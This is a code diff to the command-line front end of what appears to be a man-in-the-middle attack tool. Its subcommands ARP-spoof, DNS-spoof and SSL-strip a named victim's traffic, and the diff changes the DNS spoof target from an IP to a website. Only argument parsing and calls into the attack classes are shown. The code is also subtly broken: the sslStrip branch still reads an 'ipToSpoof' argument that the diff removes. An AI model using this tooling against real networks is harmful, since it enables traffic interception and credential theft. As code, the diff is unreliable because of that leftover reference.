@@ -34,12 +34,11 @@ def main():
     # DNS Spoof
     dns_parser = subparsers.add_parser('dnsSpoof', help='Spoof DNS responses')
     dns_parser.add_argument('--ipVictim', type=str, help='The IP address of the victim')
-    dns_parser.add_argument('--ipToSpoof', type=str, help='The IP address to spoof')
+    dns_parser.add_argument('--siteToSpoof', type=str, help='The website to spoof')
 
     # SSL Strip
     ssl_parser = subparsers.add_parser('sslStrip', help='Strip SSL from HTTP traffic')
     ssl_parser.add_argument('--ipVictim', type=str, help='The IP address of the victim')
-    ssl_parser.add_argument('--ipToSpoof', type=str, help='The IP address to spoof')
 
     # Forward packages
     forward_parser = subparsers.add_parser('forward', help='Forward packages between two hosts')
@@ -66,14 +65,14 @@ def main():
         arp_spoofer = ARPSpoofer(args.interface, args.macAttacker, args.ipAttacker, args.macVictim, args.ipVictim, args.ipToSpoof)
         arp_spoofer.spoof()
     elif args.command == 'dnsSpoof':
-        if args.ipVictim is None or args.ipToSpoof is None:
-            sys.exit("Usage: python main.py dnsSpoof --ipVictim <ip> --ipToSpoof <ip>")
-        dns_spoofer = DNSSpoofer(args.interface, args.ipAttacker, args.ipVictim, args.ipToSpoof)  
+        if args.ipVictim is None or args.siteToSpoof is None:
+            sys.exit("Usage: python main.py dnsSpoof --ipVictim <ip> --siteToSpoof <url>")
+        dns_spoofer = DNSSpoofer(args.interface, args.ipAttacker, args.ipVictim, args.siteToSpoof)  
         dns_spoofer.spoof()
     elif args.command == 'sslStrip':
         if args.ipVictim is None or args.ipToSpoof is None:
-            sys.exit("Usage: python main.py sslStrip --ipVictim <ip> --ipToSpoof <ip>")
-        ssl_stripper = SSLStripper(args.interface, args.ipAttacker, args.ipVictim, args.ipToSpoof)
+            sys.exit("Usage: python main.py sslStrip --ipVictim <ip>")
+        ssl_stripper = SSLStripper(args.interface, args.ipAttacker, args.ipVictim)
         ssl_stripper.strip()
     elif args.command == 'forward':
         if args.ipVictim is None or args.ipToSpoof is None:
